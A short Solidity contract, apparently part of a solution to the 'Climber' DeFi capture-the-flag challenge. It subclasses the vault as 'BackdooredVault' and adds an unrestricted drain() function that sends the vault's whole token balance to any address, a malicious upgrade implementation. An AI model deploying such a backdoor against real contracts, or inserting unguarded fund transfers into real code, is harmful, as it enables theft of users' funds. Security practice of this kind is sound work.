// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../src/climber/ClimberVault.sol"; // Reference to the actual Vault source;

contract BackdooredVault is ClimberVault {
    function drain(address token, address recipient) external {
        IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));
    }
}
